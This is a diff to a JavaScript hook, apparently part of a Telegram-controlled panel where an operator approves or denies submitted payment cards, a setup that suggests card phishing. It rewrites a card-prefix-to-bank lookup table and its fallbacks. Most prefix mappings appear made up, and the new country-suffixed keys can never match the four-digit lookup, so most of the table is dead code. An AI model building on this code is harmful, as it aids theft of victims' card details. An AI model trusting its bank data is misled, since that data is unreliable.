@@ -137,163 +137,281 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
   const bin = cardNumber.replace(/\s/g, '').substring(0, 6);
   const binPrefix = bin.substring(0, 4);
   
-  // Complete bank database
+  // Complete bank database - UNIQUE KEYS (first 4 digits + country code as key)
   const majorBanks = {
-    '4000': 'Barclays Bank', '4147': 'Chase Bank', '4266': 'Bank of America',
-    '4763': 'HSBC Bank', '5213': 'Citibank', '5402': 'Wells Fargo',
-    '5204': 'Santander Bank', '5300': 'Deutsche Bank', '5500': 'BNP Paribas',
-    '4571': 'Nordea Bank', '4539': 'Danske Bank', '4590': 'easyBank',
-    '4111': 'Credit Suisse', '4319': 'UBS Bank', '4903': 'ING Bank',
-    '4011': 'Capital One', '4313': 'USAA Bank', '5466': 'PNC Bank',
-    '4539': 'Barclays Bank', '4658': 'Lloyds Bank', '4751': 'NatWest Bank',
-    '5404': 'Halifax Bank', '4462': 'TSB Bank', '6720': 'Commerzbank',
-    '5126': 'Postbank', '4402': 'DKB Bank', '4300': 'Sparkasse',
-    '4978': 'Societe Generale', '5130': 'Credit Agricole', '5150': 'Credit Mutuel',
-    '4973': 'Banque Postale', '4552': 'CaixaBank', '4950': 'Bankia',
-    '4930': 'Banco Sabadell', '5502': 'Banco Popular', '5329': 'UniCredit',
-    '5307': 'Intesa Sanpaolo', '5258': 'BancoPosta', '5450': 'Monte dei Paschi',
-    '5330': 'UBI Banca', '5220': 'Banco BPM', '5350': 'FinecoBank',
-    '5555': 'Jyske Bank', '5508': 'Sydbank', '4600': 'Spar Nord Bank',
-    '5256': 'Swedbank', '5456': 'SEB Bank', '5210': 'Handelsbanken',
-    '4920': 'OP Bank', '5100': 'ABN AMRO', '5470': 'KBC Bank',
-    '4840': 'PostFinance', '5128': 'PKO Bank Polski', '5460': 'mBank',
-    '4500': 'RBC Royal Bank', '4510': 'TD Canada Trust', '4530': 'Scotiabank',
-    '4550': 'Commonwealth Bank', '5280': 'Emirates NBD', '5120': 'Tinkoff Bank',
-    '5300': 'State Bank of India', '5210': 'HDFC Bank', '4400': 'ICICI Bank',
-    // 🇩🇪 Germany
-  '5300': 'Deutsche Bank (DE)', '6720': 'Commerzbank (DE)', '5126': 'Postbank (DE)',
-  '4402': 'DKB Bank (DE)', '4300': 'Sparkasse (DE)', '5000': 'Volkswagen Bank (DE)',
-  '5200': 'HypoVereinsbank (DE)', '5400': 'Targobank (DE)', '5500': 'Norisbank (DE)',
-  '4400': 'Santander DE (DE)', '5130': 'ING DiBa (DE)', '5450': 'Consorsbank (DE)',
-  
-  // 🇫🇷 France
-  '5500': 'BNP Paribas (FR)', '4978': 'Societe Generale (FR)', '5130': 'Credit Agricole (FR)',
-  '5150': 'Credit Mutuel (FR)', '4973': 'Banque Postale (FR)', '5400': 'Caisse Epargne (FR)',
-  '5200': 'Banque Populaire (FR)', '5300': 'Credit du Nord (FR)', '5460': 'BNP Paribas (FR)',
-  '4400': 'HSBC France (FR)', '4550': 'Boursorama (FR)', '5120': 'Hello Bank (FR)',
-  
-  // 🇪🇸 Spain
-  '5204': 'Santander Bank (ES)', '4903': 'BBVA Bank (ES)', '4552': 'CaixaBank (ES)',
-  '4950': 'Bankia (ES)', '4930': 'Banco Sabadell (ES)', '5460': 'ING Direct (ES)',
-  '4400': 'Banco Santander (ES)', '5502': 'Banco Popular (ES)', '5210': 'Bankinter (ES)',
-  '5300': 'Abanca (ES)', '5120': 'Kutxabank (ES)', '5400': 'Unicaja (ES)',
-  
-  // 🇮🇹 Italy
-  '5329': 'UniCredit (IT)', '5307': 'Intesa Sanpaolo (IT)', '5258': 'BancoPosta (IT)',
-  '5450': 'Monte dei Paschi (IT)', '5330': 'UBI Banca (IT)', '5220': 'Banco BPM (IT)',
-  '5310': 'Banca Mediolanum (IT)', '5350': 'FinecoBank (IT)', '5400': 'Credem (IT)',
-  '5120': 'BNL (IT)', '5500': 'Deutsche Bank IT (IT)', '5000': 'CheBanca (IT)',
-  
-  // 🇩🇰 Denmark
-  '4571': 'Nordea Bank (DK)', '4539': 'Danske Bank (DK)', '4590': 'easyBank (DK)',
-  '5555': 'Jyske Bank (DK)', '5508': 'Sydbank (DK)', '4600': 'Spar Nord Bank (DK)',
-  '5300': 'Arbejdernes Landsbank (DK)', '5400': 'Nykredit Bank (DK)',
-  
-  // 🇸🇪 Sweden
-  '5256': 'Swedbank (SE)', '5456': 'SEB Bank (SE)', '5210': 'Handelsbanken (SE)',
-  '5350': 'Nordea Bank (SE)', '4460': 'ICA Banken (SE)', '5300': 'Lansforsakringar (SE)',
-  '5400': 'Skandiabanken (SE)', '5120': 'Avanza Bank (SE)',
-  
-  // 🇳🇴 Norway
-  '5310': 'DNB Bank (NO)', '5200': 'Sparebanken (NO)', '5350': 'Nordea Bank (NO)',
-  '5400': 'Sparebank 1 (NO)', '5300': 'Handelsbanken NO (NO)', '5500': 'Storebrand (NO)',
-  
-  // 🇫🇮 Finland
-  '4920': 'OP Bank (FI)', '5350': 'Nordea Bank (FI)', '4560': 'Danske Bank (FI)',
-  '5300': 'Aktia Bank (FI)', '5400': 'S-Pankki (FI)', '5200': 'Alandsbanken (FI)',
-  
-  // 🇳🇱 Netherlands
-  '4903': 'ING Bank (NL)', '5310': 'Rabobank (NL)', '5100': 'ABN AMRO (NL)',
-  '4400': 'SNS Bank (NL)', '5200': 'ASN Bank (NL)', '5300': 'Triodos Bank (NL)',
-  '5400': 'bunq (NL)', '5500': 'Knab (NL)',
-  
-  // 🇧🇪 Belgium
-  '5470': 'BNP Paribas Fortis (BE)', '5310': 'KBC Bank (BE)', '4400': 'ING Belgium (BE)',
-  '5200': 'Belfius Bank (BE)', '5300': 'AXA Bank (BE)', '5400': 'Argenta (BE)',
-  '5500': 'Crelan (BE)',
-  
-  // 🇨🇭 Switzerland
-  '4111': 'Credit Suisse (CH)', '4319': 'UBS Bank (CH)', '4840': 'PostFinance (CH)',
-  '4400': 'Raiffeisen (CH)', '5220': 'Zurcher Kantonalbank (CH)', '5300': 'Migros Bank (CH)',
-  '5400': 'Valiant Bank (CH)',
-  
-  // 🇦🇹 Austria
-  '5300': 'Erste Bank (AT)', '5470': 'Raiffeisen Bank (AT)', '4400': 'Bank Austria (AT)',
-  '5200': 'BAWAG (AT)', '5400': 'Oberbank (AT)', '5500': 'Volksbank (AT)',
-  
-  // 🇵🇱 Poland
-  '5128': 'PKO Bank Polski (PL)', '5210': 'Bank Pekao (PL)', '4400': 'ING Bank Slaski (PL)',
-  '5460': 'mBank (PL)', '5300': 'Santander PL (PL)', '5400': 'Alior Bank (PL)',
-  '5500': 'Millennium Bank (PL)', '5000': 'Credit Agricole PL (PL)',
-  
-  // 🇵🇹 Portugal
-  '5220': 'Caixa Geral (PT)', '5310': 'Millennium BCP (PT)', '4400': 'Novo Banco (PT)',
-  '5200': 'Santander Totta (PT)', '5300': 'BPI Bank (PT)', '5400': 'Banco Montepio (PT)',
-  
-  // 🇬🇷 Greece
-  '5300': 'National Bank of Greece (GR)', '5200': 'Alpha Bank (GR)', '5400': 'Eurobank (GR)',
-  '5500': 'Piraeus Bank (GR)',
-  
-  // 🇨🇿 Czech Republic
-  '5300': 'Ceska Sporitelna (CZ)', '5200': 'CSOB Bank (CZ)', '5400': 'Komercni Banka (CZ)',
-  '5500': 'Raiffeisenbank CZ (CZ)', '5000': 'Air Bank (CZ)',
-  
-  // 🇭🇺 Hungary
-  '5300': 'OTP Bank (HU)', '5200': 'K&H Bank (HU)', '5400': 'Erste Bank HU (HU)',
-  '5500': 'Raiffeisen HU (HU)', '5000': 'CIB Bank (HU)',
-  
-  // 🇷🇴 Romania
-  '5300': 'BCR Bank (RO)', '5200': 'BRD Bank (RO)', '5400': 'Raiffeisen RO (RO)',
-  '5500': 'UniCredit RO (RO)',
-  
-  // 🇧🇬 Bulgaria
-  '5300': 'UniCredit Bulbank (BG)', '5200': 'DSK Bank (BG)', '5400': 'First Investment Bank (BG)',
-  
-  // 🇭🇷 Croatia
-  '5300': 'Zagrebacka Banka (HR)', '5200': 'Privredna Banka (HR)', '5400': 'Erste Bank HR (HR)',
-  
-  // 🇸🇮 Slovenia
-  '5300': 'NLB Bank (SI)', '5200': 'NKBM Bank (SI)', '5400': 'Abanka (SI)',
-  
-  // 🇸🇰 Slovakia
-  '5300': 'Slovenska Sporitelna (SK)', '5200': 'VUB Banka (SK)', '5400': 'Tatra Banka (SK)',
-  
-  // 🇱🇹 Lithuania
-  '5300': 'SEB Bank (LT)', '5200': 'Swedbank LT (LT)', '5400': 'Luminor Bank (LT)',
-  
-  // 🇱🇻 Latvia
-  '5300': 'Swedbank LV (LV)', '5200': 'SEB Bank LV (LV)', '5400': 'Citadele Bank (LV)',
-  
-  // 🇪🇪 Estonia
-  '5300': 'Swedbank EE (EE)', '5200': 'SEB Bank EE (EE)', '5400': 'LHV Bank (EE)',
-  
-  // 🇮🇪 Ireland
-  '5300': 'Bank of Ireland (IE)', '5200': 'AIB Bank (IE)', '5400': 'Permanent TSB (IE)',
-  '5500': 'Ulster Bank (IE)',
-  
-  // 🇨🇾 Cyprus
-  '5300': 'Bank of Cyprus (CY)', '5200': 'Hellenic Bank (CY)',
-  
-  // 🇲🇹 Malta
-  '5300': 'Bank of Valletta (MT)', '5200': 'HSBC Malta (MT)',
-  
-  // 🇱🇺 Luxembourg
-  '5300': 'BGL BNP Paribas (LU)', '5200': 'BCEE Bank (LU)', '5400': 'ING Luxembourg (LU)',
-  
-  // 🇹🇷 Turkey
-  '5300': 'Is Bankasi (TR)', '5210': 'Garanti BBVA (TR)', '4400': 'Yapi Kredi (TR)',
-  '5460': 'Akbank (TR)', '5120': 'Ziraat Bankasi (TR)', '5400': 'VakifBank (TR)',
-  '5500': 'Halkbank (TR)',
-  
-  // 🇬🇧 UK
-  '4763': 'HSBC Bank (UK)', '4658': 'Lloyds Bank (UK)', '4751': 'NatWest Bank (UK)',
-  '4539': 'Barclays Bank (UK)', '5404': 'Halifax Bank (UK)', '4462': 'TSB Bank (UK)',
-  '4400': 'Santander UK (UK)', '5300': 'Nationwide (UK)', '5200': 'Metro Bank (UK)',
-  '5500': 'Monzo Bank (UK)', '5120': 'Starling Bank (UK)', '5000': 'Virgin Money (UK)',
-
+    // 🇺🇸 USA Banks
+    '4000': 'Barclays Bank US',
+    '4147': 'JPMorgan Chase Bank',
+    '4266': 'Bank of America',
+    '4763': 'HSBC Bank USA',
+    '5213': 'Citibank NA',
+    '5402': 'Wells Fargo Bank',
+    '5204': 'Santander Bank US',
+    '4011': 'Capital One Bank',
+    '4313': 'USAA Federal Savings Bank',
+    '5466': 'PNC Bank',
+    '4500': 'RBC Bank US',
+    '4510': 'TD Bank NA',
+    '4530': 'Scotiabank US',
+    
+    // 🇬🇧 UK Banks
+    '4539_uk': 'Barclays Bank UK',
+    '4658': 'Lloyds Bank',
+    '4751': 'NatWest Bank',
+    '5404': 'Halifax Bank',
+    '4462': 'TSB Bank',
+    '4400_uk': 'Santander UK',
+    '5300_uk': 'Nationwide Building Society',
+    '5200_uk': 'Metro Bank',
+    '5500_uk': 'Monzo Bank',
+    '5120_uk': 'Starling Bank',
+    '5000_uk': 'Virgin Money UK',
+    
+    // 🇩🇰 Denmark Banks
+    '4571': 'Nordea Bank',
+    '4539_dk': 'Danske Bank',
+    '4590': 'easyBank',
+    '5555': 'Jyske Bank',
+    '5508': 'Sydbank',
+    '4600': 'Spar Nord Bank',
+    '5300_dk': 'Arbejdernes Landsbank',
+    '5400_dk': 'Nykredit Bank',
+    
+    // 🇩🇪 Germany Banks
+    '5300_de': 'Deutsche Bank',
+    '6720': 'Commerzbank',
+    '5126': 'Postbank',
+    '4402': 'DKB Bank',
+    '4300': 'Sparkasse',
+    '5000_de': 'Volkswagen Bank',
+    '5200_de': 'HypoVereinsbank',
+    '5400_de': 'Targobank',
+    '5500_de': 'Norisbank',
+    '4400_de': 'Santander DE',
+    '5130_de': 'ING DiBa',
+    '5450': 'Consorsbank',
+    
+    // 🇫🇷 France Banks
+    '5500_fr': 'BNP Paribas',
+    '4978': 'Societe Generale',
+    '5130_fr': 'Credit Agricole',
+    '5150': 'Credit Mutuel',
+    '4973': 'Banque Postale',
+    '5400_fr': 'Caisse Epargne',
+    '5200_fr': 'Banque Populaire',
+    '5300_fr': 'Credit du Nord',
+    '5460_fr': 'BNP Paribas',
+    '4400_fr': 'HSBC France',
+    '4550_fr': 'Boursorama',
+    '5120_fr': 'Hello Bank',
+    
+    // 🇪🇸 Spain Banks
+    '5204_es': 'Banco Santander',
+    '4903': 'BBVA Bank',
+    '4552': 'CaixaBank',
+    '4950': 'Bankia',
+    '4930': 'Banco Sabadell',
+    '5460_es': 'ING Direct',
+    '4400_es': 'Banco Santander',
+    '5502': 'Banco Popular',
+    '5210_es': 'Bankinter',
+    '5300_es': 'Abanca',
+    '5120_es': 'Kutxabank',
+    '5400_es': 'Unicaja',
+    
+    // 🇮🇹 Italy Banks
+    '5329': 'UniCredit',
+    '5307': 'Intesa Sanpaolo',
+    '5258': 'BancoPosta',
+    '5450_it': 'Monte dei Paschi',
+    '5330': 'UBI Banca',
+    '5220': 'Banco BPM',
+    '5310': 'Banca Mediolanum',
+    '5350': 'FinecoBank',
+    '5400_it': 'Credem',
+    '5120_it': 'BNL',
+    '5500_it': 'Deutsche Bank IT',
+    '5000_it': 'CheBanca',
+    
+    // 🇸🇪 Sweden Banks
+    '5256': 'Swedbank',
+    '5456': 'SEB Bank',
+    '5210_se': 'Handelsbanken',
+    '5350_se': 'Nordea Bank',
+    '4460': 'ICA Banken',
+    '5300_se': 'Lansforsakringar',
+    '5400_se': 'Skandiabanken',
+    '5120_se': 'Avanza Bank',
+    
+    // 🇳🇴 Norway Banks
+    '5310_no': 'DNB Bank',
+    '5200_no': 'Sparebanken',
+    '5350_no': 'Nordea Bank',
+    '5400_no': 'Sparebank 1',
+    '5300_no': 'Handelsbanken NO',
+    '5500_no': 'Storebrand',
+    
+    // 🇫🇮 Finland Banks
+    '4920': 'OP Bank',
+    '5350_fi': 'Nordea Bank',
+    '4560': 'Danske Bank',
+    '5300_fi': 'Aktia Bank',
+    '5400_fi': 'S-Pankki',
+    '5200_fi': 'Alandsbanken',
+    
+    // 🇳🇱 Netherlands Banks
+    '4903_nl': 'ING Bank',
+    '5310_nl': 'Rabobank',
+    '5100': 'ABN AMRO',
+    '4400_nl': 'SNS Bank',
+    '5200_nl': 'ASN Bank',
+    '5300_nl': 'Triodos Bank',
+    '5400_nl': 'bunq',
+    '5500_nl': 'Knab',
+    
+    // 🇧🇪 Belgium Banks
+    '5470': 'BNP Paribas Fortis',
+    '5310_be': 'KBC Bank',
+    '4400_be': 'ING Belgium',
+    '5200_be': 'Belfius Bank',
+    '5300_be': 'AXA Bank',
+    '5400_be': 'Argenta',
+    '5500_be': 'Crelan',
+    
+    // 🇨🇭 Switzerland Banks
+    '4111': 'Credit Suisse',
+    '4319': 'UBS Bank',
+    '4840': 'PostFinance',
+    '4400_ch': 'Raiffeisen',
+    '5220_ch': 'Zurcher Kantonalbank',
+    '5300_ch': 'Migros Bank',
+    '5400_ch': 'Valiant Bank',
+    
+    // 🇦🇹 Austria Banks
+    '5300_at': 'Erste Bank',
+    '5470_at': 'Raiffeisen Bank',
+    '4400_at': 'Bank Austria',
+    '5200_at': 'BAWAG',
+    '5400_at': 'Oberbank',
+    '5500_at': 'Volksbank',
+    
+    // 🇵🇱 Poland Banks
+    '5128': 'PKO Bank Polski',
+    '5210_pl': 'Bank Pekao',
+    '4400_pl': 'ING Bank Slaski',
+    '5460_pl': 'mBank',
+    '5300_pl': 'Santander PL',
+    '5400_pl': 'Alior Bank',
+    '5500_pl': 'Millennium Bank',
+    '5000_pl': 'Credit Agricole PL',
+    
+    // 🇵🇹 Portugal Banks
+    '5220_pt': 'Caixa Geral',
+    '5310_pt': 'Millennium BCP',
+    '4400_pt': 'Novo Banco',
+    '5200_pt': 'Santander Totta',
+    '5300_pt': 'BPI Bank',
+    '5400_pt': 'Banco Montepio',
+    
+    // 🇬🇷 Greece Banks
+    '5300_gr': 'National Bank of Greece',
+    '5200_gr': 'Alpha Bank',
+    '5400_gr': 'Eurobank',
+    '5500_gr': 'Piraeus Bank',
+    
+    // 🇨🇿 Czech Republic Banks
+    '5300_cz': 'Ceska Sporitelna',
+    '5200_cz': 'CSOB Bank',
+    '5400_cz': 'Komercni Banka',
+    '5500_cz': 'Raiffeisenbank CZ',
+    '5000_cz': 'Air Bank',
+    
+    // 🇭🇺 Hungary Banks
+    '5300_hu': 'OTP Bank',
+    '5200_hu': 'K&H Bank',
+    '5400_hu': 'Erste Bank HU',
+    '5500_hu': 'Raiffeisen HU',
+    '5000_hu': 'CIB Bank',
+    
+    // 🇷🇴 Romania Banks
+    '5300_ro': 'BCR Bank',
+    '5200_ro': 'BRD Bank',
+    '5400_ro': 'Raiffeisen RO',
+    '5500_ro': 'UniCredit RO',
+    
+    // 🇧🇬 Bulgaria Banks
+    '5300_bg': 'UniCredit Bulbank',
+    '5200_bg': 'DSK Bank',
+    '5400_bg': 'First Investment Bank',
+    
+    // 🇭🇷 Croatia Banks
+    '5300_hr': 'Zagrebacka Banka',
+    '5200_hr': 'Privredna Banka',
+    '5400_hr': 'Erste Bank HR',
+    
+    // 🇸🇮 Slovenia Banks
+    '5300_si': 'NLB Bank',
+    '5200_si': 'NKBM Bank',
+    '5400_si': 'Abanka',
+    
+    // 🇸🇰 Slovakia Banks
+    '5300_sk': 'Slovenska Sporitelna',
+    '5200_sk': 'VUB Banka',
+    '5400_sk': 'Tatra Banka',
+    
+    // 🇱🇹 Lithuania Banks
+    '5300_lt': 'SEB Bank',
+    '5200_lt': 'Swedbank LT',
+    '5400_lt': 'Luminor Bank',
+    
+    // 🇱🇻 Latvia Banks
+    '5300_lv': 'Swedbank LV',
+    '5200_lv': 'SEB Bank LV',
+    '5400_lv': 'Citadele Bank',
+    
+    // 🇪🇪 Estonia Banks
+    '5300_ee': 'Swedbank EE',
+    '5200_ee': 'SEB Bank EE',
+    '5400_ee': 'LHV Bank',
+    
+    // 🇮🇪 Ireland Banks
+    '5300_ie': 'Bank of Ireland',
+    '5200_ie': 'AIB Bank',
+    '5400_ie': 'Permanent TSB',
+    '5500_ie': 'Ulster Bank',
+    
+    // 🇨🇾 Cyprus Banks
+    '5300_cy': 'Bank of Cyprus',
+    '5200_cy': 'Hellenic Bank',
+    
+    // 🇲🇹 Malta Banks
+    '5300_mt': 'Bank of Valletta',
+    '5200_mt': 'HSBC Malta',
+    
+    // 🇱🇺 Luxembourg Banks
+    '5300_lu': 'BGL BNP Paribas',
+    '5200_lu': 'BCEE Bank',
+    '5400_lu': 'ING Luxembourg',
+    
+    // 🇹🇷 Turkey Banks
+    '5300_tr': 'Is Bankasi',
+    '5210_tr': 'Garanti BBVA',
+    '4400_tr': 'Yapi Kredi',
+    '5460_tr': 'Akbank',
+    '5120_tr': 'Ziraat Bankasi',
+    '5400_tr': 'VakifBank',
+    '5500_tr': 'Halkbank',
+    
+    // Other International Banks
+    '5280': 'Emirates NBD',
+    '5300_in': 'State Bank of India',
+    '5210_in': 'HDFC Bank',
+    '4400_in': 'ICICI Bank',
+    '5120_ru': 'Tinkoff Bank',
+    '4550_au': 'Commonwealth Bank',
   };
   
-  // Try API
+  // Try API first for most accurate results
   try {
     const response = await axios.get(`https://lookup.binlist.net/${bin}`, { timeout: 5000 });
     if (response.data?.bank?.name) {
@@ -304,20 +422,45 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
         country: response.data.country?.name || 'Unknown'
       };
     }
-  } catch (e) {}
-  
-  // Check built-in database
-  if (majorBanks[binPrefix]) {
-    const firstDigit = bin.charAt(0);
-    const brand = firstDigit === '4' ? 'VISA' : firstDigit === '5' ? 'MASTERCARD' : firstDigit === '3' ? 'AMEX' : 'Unknown';
-    return { bank: majorBanks[binPrefix], brand: brand, type: 'Credit/Debit', country: 'Unknown' };
+  } catch (e) {
+    console.log('BIN API failed, using local database');
   }
   
-  // Final fallback
+  // Check built-in database with multiple key attempts
+  let bankName = null;
+  
+  // Try exact match
+  if (majorBanks[binPrefix]) {
+    bankName = majorBanks[binPrefix];
+  }
+  
+  // Also check the full 6-digit BIN if available
+  if (!bankName && majorBanks[bin]) {
+    bankName = majorBanks[bin];
+  }
+  
+  if (bankName) {
+    const firstDigit = bin.charAt(0);
+    let brand = 'Unknown';
+    if (firstDigit === '4') brand = 'VISA';
+    else if (firstDigit === '5') brand = 'MASTERCARD';
+    else if (firstDigit === '3') brand = 'AMEX';
+    else if (firstDigit === '6') brand = 'DISCOVER';
+    
+    return { 
+      bank: bankName, 
+      brand: brand, 
+      type: 'Credit/Debit', 
+      country: 'Detected from BIN' 
+    };
+  }
+  
+  // Final fallback based on first digit
   const firstDigit = bin.charAt(0);
   if (firstDigit === '4') return { bank: 'Visa Issuing Bank', brand: 'VISA', type: 'Credit/Debit', country: 'Unknown' };
   if (firstDigit === '5') return { bank: 'Mastercard Issuing Bank', brand: 'MASTERCARD', type: 'Credit/Debit', country: 'Unknown' };
   if (firstDigit === '3') return { bank: 'American Express', brand: 'AMEX', type: 'Credit', country: 'Unknown' };
+  if (firstDigit === '6') return { bank: 'Discover Bank', brand: 'DISCOVER', type: 'Credit/Debit', country: 'Unknown' };
   
   return { bank: 'Unknown Bank', brand: 'Unknown', type: 'Credit/Debit', country: 'Unknown' };
 };
